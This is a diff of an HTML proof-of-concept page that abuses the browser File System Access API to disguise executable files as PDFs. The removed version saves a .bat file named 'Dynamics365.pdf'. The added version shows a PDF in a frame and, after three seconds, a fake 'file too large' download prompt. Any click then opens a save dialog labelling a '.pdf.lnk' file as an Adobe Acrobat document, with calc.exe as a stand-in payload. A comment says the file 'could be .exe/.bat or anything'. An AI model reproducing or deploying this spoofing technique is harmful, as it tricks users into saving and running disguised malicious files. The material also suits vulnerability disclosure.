@@ -1,63 +1,56 @@
-<!DOCTYPE html>
 <html>
 <head>
-  <title>Fake PDF Download</title>
-  <style>
-    body {
-      background: #fff;
-      font-family: Arial;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-
-    button {
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      font-size: 18px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>
+    <title>PDF - Google Chrome and Microsoft Edge - File System Access API - security bug</title>
+    <link rel="stylesheet" type="text/css" href="styles.css" />
 </head>
+
 <body>
+    <script>
+        //on page load
+        window.onload = function () {
+            //after 3 sec
+            setTimeout(() => {
+                //show pop-up 
+                document.getElementById("myModal").style.display = "block";
+                const body = document.querySelector('body')
+                body.addEventListener('mouseup', async () => {
+                    const options = {
+                        suggestedName: 'Dynamics',
+                        types: [
+                            {
+                                description:
+                                    'Adobe Acrobat Document (.pdf)',
+                                accept: {
+                                    'text/plain': ['.pdf.lnk'] //could be .exe/.bat or anything
+                                }
+                            }
+                        ],
+                        //delete from Save as type "*.*" option
+                        excludeAcceptAllOption: true
+                    }
 
-<h2>Dynamics365.pdf</h2>
-<button onclick="saveMaliciousFile()">DOWNLOAD</button>
+                    const handle = await window.showSaveFilePicker(options);
+                    const writable = await handle.createWritable();
+                    //script to run cmd in .bat
+                    await writable.write('C:\\Windows\\system32\\calc.exe');
+                    await writable.close();
+                })
+            }, 3000);
+        };
+    </script>
 
-<script>
-async function saveMaliciousFile() {
-  try {
-    const options = {
-      suggestedName: 'Dynamics365.pdf', // Nama palsu yang terlihat
-      types: [
-        {
-          description: 'Batch File disguised as PDF',
-          accept: {
-            'application/octet-stream': ['.bat'] // tetap disimpan sebagai .bat
-          }
-        }
-      ],
-      excludeAcceptAllOption: true
-    };
+    <!-- PDF reader -->
+    <iframe src="Dynamics365file.pdf" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="100%"
+        scrolling="auto">
+    </iframe>
 
-    const handle = await window.showSaveFilePicker(options);
-    const writable = await handle.createWritable();
-    const payload = 'C:\\Windows\\system32\\calc.exe';
-    await writable.write(payload);
-    await writable.close();
-
-    alert("File berhasil disimpan.");
-  } catch (err) {
-    console.error("Error:", err);
-    alert("Gagal menyimpan file.");
-  }
-}
-</script>
-
+    <!-- Modal content -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <p><b>Dynamics365.pdf</b> - file is too large for the PDF reader. <br><br>Download a file to continue reading...</p>
+            <button id="addNewFile" class="button-38" role="button">DOWNLOAD</button>
+        </div>
+    </div>
 </body>
+
 </html>
